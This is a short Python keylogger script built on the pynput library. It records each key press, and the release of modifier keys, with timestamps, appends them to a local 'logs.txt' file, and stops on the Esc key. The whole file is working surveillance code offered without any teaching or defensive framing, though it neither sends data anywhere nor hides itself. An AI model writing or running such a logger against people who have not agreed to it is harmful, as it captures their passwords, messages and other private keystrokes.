from pynput.keyboard import Key, Listener
import os
import datetime

FILE_PATH = 'logs.txt'  
log_file = open(FILE_PATH, 'a')

# Some keys which we'd like to know the state of (pressed or released) 
func_keys = set([
    Key.alt, Key.alt_gr, Key.alt_l, Key.alt_l, Key.alt_r,
    Key.cmd, Key.cmd_l, Key.cmd_r,
    Key.ctrl, Key.ctrl_l, Key.ctrl_r,
    Key.shift_l, Key.shift, Key.shift_r
    ])


# State of the keys
class _State():
    up = 0
    down = 1


# Keylogging. Now is writing to the file
def log_key(key, state):
    key_name = str(key)[1] if len(str(key)) < 4 else str(key)[4:]
    sign = '(up)' if state == _State.up else ''
    time = datetime.datetime.now().time() 
    # Write to file
    log_file.write('%-15s %-15s %-15s\n' % (key_name, sign, time))
    # Save file
    log_file.flush()
    os.fsync(log_file.fileno())


# Interrupt the keylogger
def stop_logger():
    log_file.close()
 

def on_press(key):
    log_key(key, _State.down)


def on_release(key):
    if key in func_keys:
        log_key(key, _State.up)
    if key == Key.esc:
        # Stop listener
        stop_logger()
        return False

# Start logging
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()